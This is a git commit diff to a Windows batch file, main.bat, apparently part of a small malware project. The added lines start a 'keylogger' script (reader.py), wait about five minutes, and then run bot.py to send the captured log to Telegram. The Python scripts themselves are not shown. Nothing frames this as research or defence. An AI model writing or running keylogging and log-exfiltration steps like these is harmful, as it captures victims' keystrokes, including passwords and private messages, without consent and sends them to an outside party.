82e798cbceb719cecfd48ce181abbc677bc21574
akumaShinda <luciusmj@outlook.com>
2025-07-02 19:12:36 +0930

    main.bat

--- main.bat
+++ main.bat
@@ -1,3 +1,11 @@
-python bot.py
+@echo off
+echo [*] Starting keylogger (5 min)...
 python reader.py
 
+echo [*] Waiting 310 seconds for logging to complete...
+timeout /t 310 >nul
+
+echo [*] Sending log to Telegram...
+python bot.py
+
+echo [*] Done.
